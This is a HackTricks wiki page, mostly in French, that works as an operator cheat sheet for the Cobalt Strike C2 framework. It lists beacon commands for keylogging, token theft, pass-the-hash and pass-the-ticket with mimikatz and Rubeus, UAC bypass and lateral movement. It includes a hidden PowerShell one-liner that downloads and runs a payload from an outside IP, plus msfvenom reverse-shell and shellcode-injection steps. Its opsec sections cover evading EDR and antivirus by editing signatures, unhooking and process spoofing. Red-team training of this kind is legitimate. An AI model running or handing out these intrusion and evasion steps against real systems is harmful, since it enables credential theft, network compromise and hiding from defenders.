# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` puis vous pouvez sélectionner où écouter, quel type de beacon utiliser (http, dns, smb...) et plus.

### Peer2Peer Listeners

Les beacons de ces listeners n'ont pas besoin de communiquer directement avec le C2 ; ils peuvent communiquer avec lui via d'autres beacons.

`Cobalt Strike -> Listeners -> Add/Edit` puis vous devez sélectionner les beacons TCP ou SMB

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Générer & héberger des payloads

#### Générer des payloads dans des fichiers

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** for an office document with a macro
* **`Windows Executable`** for a .exe, .dll or service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

#### Générer & héberger des payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

#### Héberger des payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.

### Options du beacon

<details>
<summary>Options et commandes du beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Implants personnalisés / Linux Beacons

- Un agent personnalisé n'a besoin que de parler le protocole HTTP/S du Cobalt Strike Team Server (default malleable C2 profile) pour s'enregistrer (check-in) et recevoir des tâches. Implémentez les mêmes URIs/headers/metadata crypto définis dans le profile pour réutiliser l'UI de Cobalt Strike pour le tasking et l'output.
- Un Aggressor Script (par ex., `CustomBeacon.cna`) peut encapsuler la génération de payloads pour le beacon non-Windows afin que les opérateurs puissent sélectionner le listener et produire des payloads ELF directement depuis le GUI.
- Exemples de gestionnaires de tâches Linux exposés au Team Server : `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, et `exit`. Ceux-ci correspondent aux IDs de tâches attendus par le Team Server et doivent être implémentés côté serveur pour renvoyer la sortie dans le format approprié.
- Le support BOF sur Linux peut être ajouté en chargeant des Beacon Object Files in-process avec [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supporte aussi les BOFs style Outflank), permettant une post-exploitation modulaire s'exécutant dans le contexte/les privilèges de l'implant sans créer de nouveaux processus.
- Intégrez un gestionnaire SOCKS dans le beacon personnalisé pour conserver la parité de pivot avec les Windows Beacons : quand l'opérateur exécute `socks <port>` l'implant doit ouvrir un proxy local pour router les outils de l'opérateur via l'hôte Linux compromis vers les réseaux internes.

## Opsec

### Execute-Assembly

Le **`execute-assembly`** utilise un **processus sacrificiel** via remote process injection pour exécuter le programme indiqué. C'est très bruyant car pour injecter dans un processus certaines Win APIs sont utilisées et chaque EDR les surveille. Cependant, il existe des outils personnalisés qui peuvent être utilisés pour charger quelque chose dans le même processus :

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Dans Cobalt Strike vous pouvez aussi utiliser BOF (Beacon Object Files) : [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

L'aggressor script `https://github.com/outflanknl/HelpColor` va créer la commande `helpx` dans Cobalt Strike qui colorera les commandes pour indiquer si elles sont des BOFs (vert), si elles sont Frok&Run (jaune) et similaires, ou si elles sont ProcessExecution, injection ou semblable (rouge). Cela aide à identifier quelles commandes sont plus discrètes.

### Agir comme l'utilisateur

Vous pouvez vérifier des événements tels que `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` :

- Security EID 4624 - Vérifiez tous les logons interactifs pour connaître les heures habituelles d'utilisation.
- System EID 12,13 - Vérifiez la fréquence des arrêts/démarrages/mises en veille.
- Security EID 4624/4625 - Vérifiez les tentatives NTLM entrantes valides/invalides.
- Security EID 4648 - Cet événement est créé lorsque des credentials en clair sont utilisés pour se connecter. Si un processus l'a généré, le binaire peut potentiellement contenir les credentials en clair dans un fichier de config ou dans le code.

Lorsque vous utilisez `jump` depuis cobalt strike, il est préférable d'utiliser la méthode `wmi_msbuild` pour que le nouveau processus paraisse plus légitime.

### Utiliser des comptes machine

Il est courant que les défenseurs surveillent des comportements étranges générés par des utilisateurs et **excluent les comptes de service et comptes machine comme `*$` de leur monitoring**. Vous pouvez utiliser ces comptes pour effectuer des mouvements latéraux ou une élévation de privilèges.

### Utiliser des stageless payloads

Les stageless payloads sont moins bruyants que les staged car ils n'ont pas besoin de télécharger un second stage depuis le serveur C2. Cela signifie qu'ils ne génèrent pas de trafic réseau après la connexion initiale, les rendant moins susceptibles d'être détectés par les défenses réseau.

### Tokens & Token Store

Faites attention lorsque vous volez ou générez des tokens car il peut être possible pour un EDR d'énumérer tous les tokens de tous les threads et de retrouver un **token appartenant à un autre utilisateur** ou même SYSTEM dans le processus.

Il est utile de stocker les tokens **par beacon** pour ne pas avoir à voler le même token encore et encore. C'est pratique pour le lateral movement ou lorsque vous devez réutiliser un token volé plusieurs fois :

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Lors de déplacements latéraux, il est généralement préférable de **voler un token plutôt que d'en générer un nouveau** ou d'effectuer une attaque pass-the-hash.

### Guardrails

Cobalt Strike possède une fonctionnalité appelée **Guardrails** qui aide à prévenir l'utilisation de certaines commandes ou actions susceptibles d'être détectées par les défenseurs. Les Guardrails peuvent être configurés pour bloquer des commandes spécifiques, telles que `make_token`, `jump`, `remote-exec`, et d'autres souvent utilisées pour le lateral movement ou l'élévation de privilèges.

De plus, le repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) contient aussi des vérifications et des idées à considérer avant d'exécuter un payload.

### Chiffrement des tickets

Dans un AD, faites attention au chiffrement des tickets. Par défaut, certains outils utiliseront RC4 pour chiffrer les tickets Kerberos, ce qui est moins sécurisé que AES et, par défaut, les environnements à jour utiliseront AES. Cela peut être détecté par des défenseurs qui surveillent les algorithmes de chiffrement faibles.

### Éviter les valeurs par défaut

Lorsque vous utilisez Cobalt Strike par défaut, les pipes SMB auront les noms `msagent_####` et `status_####`. Changez ces noms. Il est possible de vérifier les noms des pipes existants depuis Cobalt Strike avec la commande : `ls \\.\pipe\`

De plus, pour les sessions SSH un pipe appelé `\\.\pipe\postex_ssh_####` est créé. Changez-le avec `set ssh_pipename "<new_name>";`.

Aussi, dans les attaques postexploitation les pipes `\\.\pipe\postex_####` peuvent être modifiés avec `set pipename "<new_name>"`.

Dans les profiles Cobalt Strike vous pouvez aussi modifier des éléments comme :

- Éviter d'utiliser `rwx`
- Comment le comportement d'injection de processus fonctionne (quelles APIs seront utilisées) dans le bloc `process-inject {...}`
- Comment le "fork and run" fonctionne dans le bloc `post-ex {…}`
- Le temps de sleep
- La taille max des binaires à charger en mémoire
- L'empreinte mémoire et le contenu DLL avec le bloc `stage {...}`
- Le trafic réseau

### Contourner le scan mémoire

Certains EDRs scannent la mémoire pour des signatures de malwares connues. Cobalt Strike permet de modifier la fonction `sleep_mask` en tant que BOF qui pourra chiffrer la backdoor en mémoire.

### Injections de processus bruyantes

Lors de l'injection de code dans un processus, c'est généralement très bruyant, car **aucun processus régulier n'effectue habituellement cette action et les méthodes disponibles sont très limitées**. Par conséquent, cela peut être détecté par des systèmes de détection comportementale. De plus, cela peut aussi être détecté par des EDRs qui scannent le réseau à la recherche de **threads contenant du code qui n'est pas sur disque** (bien que des processus comme les navigateurs utilisant le JIT fassent cela couramment). Exemple : [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Lors de la création d'un nouveau processus, il est important de **maintenir une relation parent-enfant régulière** entre les processus pour éviter la détection. Si svchost.exec exécute iexplorer.exe cela paraîtra suspect, car svchost.exe n'est pas normalement le parent de iexplorer.exe dans un environnement Windows standard.

Quand un nouveau beacon est spawné dans Cobalt Strike, par défaut un processus utilisant **`rundll32.exe`** est créé pour exécuter le nouveau listener. Ce n'est pas très stealthy et peut être facilement détecté par les EDRs. De plus, `rundll32.exe` est lancé sans arguments ce qui le rend encore plus suspect.

Avec la commande suivante de Cobalt Strike, vous pouvez spécifier un processus différent pour spawn le nouveau beacon, le rendant moins détectable :
```bash
spawnto x86 svchost.exe
```
Vous pouvez aussi modifier ces paramètres `spawnto_x86` et `spawnto_x64` dans un profil.

### Proxying le trafic des attaquants

Les attaquants auront parfois besoin d'exécuter des outils localement, même sur des machines linux, et de faire en sorte que le trafic des victimes atteigne l'outil (par ex. NTLM relay).

De plus, pour réaliser une attaque pass-the.hash ou pass-the-ticket, il est parfois plus discret pour l'attaquant d'**ajouter ce hash ou ticket dans son propre processus LSASS** localement, puis de pivoter depuis celui-ci plutôt que de modifier le processus LSASS d'une machine victime.

Cependant, vous devez être **prudent avec le trafic généré**, car vous pourriez émettre du trafic inhabituel (kerberos ?) depuis votre backdoor process. Pour cela, vous pourriez pivoter vers un browser process (bien que vous puissiez être repéré en vous injectant dans un processus, pensez donc à une manière discrète de le faire).


### Éviter les AVs

#### AV/AMSI/ETW Bypass

Consultez la page :


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Généralement, dans `/opt/cobaltstrike/artifact-kit` vous pouvez trouver le code et les templates pré-compilés (dans `/src-common`) des payloads que cobalt strike va utiliser pour générer les beacons binaires.

En utilisant [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) avec le backdoor généré (ou juste avec le template compilé) vous pouvez identifier ce qui fait déclencher defender. C'est généralement une chaîne. Vous pouvez donc simplement modifier le code qui génère le backdoor pour que cette chaîne n'apparaisse pas dans le binaire final.

Après avoir modifié le code, exécutez simplement `./build.sh` depuis le même répertoire et copiez le dossier `dist-pipe/` dans le client Windows à `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
N'oubliez pas de charger le script agressif `dist-pipe\artifact.cna` pour indiquer à Cobalt Strike d'utiliser les ressources depuis le disque que nous voulons et non celles déjà chargées.

#### Resource Kit

Le dossier ResourceKit contient les modèles pour les payloads scriptés de Cobalt Strike, notamment PowerShell, VBA et HTA.

En utilisant [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) avec les modèles, vous pouvez identifier ce que le defender (AMSI dans ce cas) n'aime pas et le modifier :
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
En modifiant les lignes détectées, on peut générer un modèle qui ne sera pas détecté.

N'oubliez pas de charger le script agressif `ResourceKit\resources.cna` pour indiquer à Cobalt Strike d'utiliser les ressources depuis le disque que nous voulons et non celles déjà chargées.

#### Function hooks | Syscall

Function hooking est une méthode très courante utilisée par les ERDs pour détecter une activité malveillante. Cobalt Strike permet de contourner ces hooks en utilisant **syscalls** au lieu des appels standard de l'API Windows via la config **`None`**, ou d'utiliser la version `Nt*` d'une fonction avec le paramètre **`Direct`**, ou simplement de sauter la fonction `Nt*` avec l'option **`Indirect`** dans le malleable profile. Selon le système, une option peut être plus discrète qu'une autre.

Cela peut être défini dans le profile ou en utilisant la commande **`syscall-method`**

Cependant, cela peut aussi générer du bruit.

Une des options offertes par Cobalt Strike pour contourner les hooks est de supprimer ces hooks avec : [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Vous pouvez également vérifier quelles fonctions sont hookées avec [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ou [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Commandes diverses de Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Références

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
